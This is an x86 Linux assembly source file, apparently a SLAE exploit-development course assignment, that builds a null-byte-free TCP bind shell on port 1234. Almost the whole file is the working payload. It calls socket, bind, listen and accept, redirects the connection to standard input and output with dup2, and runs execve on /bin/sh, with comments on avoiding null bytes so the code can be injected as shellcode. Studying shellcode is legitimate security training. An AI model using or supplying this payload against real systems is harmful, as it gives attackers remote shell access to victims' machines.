; SLAE-X 
; thanks to writesup from previou students
; syscalls doc is here: /usr/include/i386-linux-gnu/asm/unistd_32.h
; originality : not much in this assignment, NASM function allowing to specify port in human readable format, my own assembly to avoid null bytes 
; requirement : no null byte only , verify with objdump -d simplebindshell -M intel | grep 00


; this function allows to specify port in human readable format 
%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 1234
PORT equ htons(_port) 
; this function is NOT injected in assembly by compiler, it is computed at build time 

global _start 


_start: 
	; syscall "socket", with fd argument provided, 0x1 in ebx 
	; arguments are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
	; we use bl register instead of ebx because "mov ebx,0x1" contains null bytes, for example b8 66 00 00 00 mov eax,0x66
	mov    bl,0x1
	; the two next operands simply replace "push 0x0" which contains a null byte, we will usually use xor x,x and push x to push 0  
	xor eax,eax
	push eax 
	; arguments 
	push   0x1
	push   0x2
	; we create a structure by sending a pointer to this struct as argument, the struct lives on the stack, this is why we pushed previous values onto the stack, to create this struct    
	mov    ecx,esp
	; syscall "socket" is number 112, 0x66 in hex 
	mov    al,0x66
	int    0x80
	; saving the file descriptor received into edi, i tried to use the .bss section at first but it did not work on shellcode injection (it skips the part where the elf init the .bss?) 
	mov    edi,eax

	; syscall "socket", with bind argument provided, 0x2 in ebx  
	mov    bl,0x2
	; push 0x0 
	xor    esi,esi
	push   esi
	push word  PORT 
	push word  0x2
	mov    ecx,esp
	push   0x10
	push   ecx
	push   edi
	mov    ecx,esp
	mov    al,0x66
	int    0x80

	; syscall "socket", with argument listen, 0x4 in ebx  
	; push 0x0 
	xor esi,esi
	push   esi
	push   edi
	mov    ecx,esp
	mov    al,0x66
	mov    bl,0x4
	int    0x80

	; syscall "socket", with argument accept, 0x5 in ebx  
	mov    al,0x66
	mov    bl,0x5
	; push 0x0 two times for aguments to accept 
	xor esi,esi
	push   esi
	push   esi
	push   edi
	mov    ecx,esp
	int    0x80

	; duplicating fd from socket to stdin stdout stderr of the process 
	mov    ebx,eax
	; we need to clean ecx, at this state it contains data such as "0xBFFFF39C"
	; since we use "mov cl" and not mov ecx (to avoid null byte) we dont want to have this remaining data and break the loop 
	xor ecx,ecx
	mov    cl,0x2
	; we use a loop for iterating cl, ie from 2 , 1 to 0 
	loop: 
	; syscall dup2 
	mov    al,0x3f
	int    0x80
	dec    ecx
	; sign flag is not set if ecx is not inferior to 0 
	; so we use jump if not sign which check the flag  
	jns    loop 

	; syscall "execve", with arguments /bin/sh null terminated and a null string for envp argument  
	mov    al,0xb
	xor esi,esi
	push   esi 
	push   0x68732f2f ; 
	push   0x6e69622f ; 
	mov    ebx,esp
	; push null termination 
	xor esi,esi
	push   esi 
	mov    edx,esp
	push   ebx
	mov    ecx,esp
	int    0x80

	; exit cleanly 
	; clean up eax 
	xor eax,eax 
	; avoid null byte  
	mov    al,0x1
	; move 0 into ebx without null byte 
	xor esi,esi 
	mov    ebx,esi 
	int    0x80
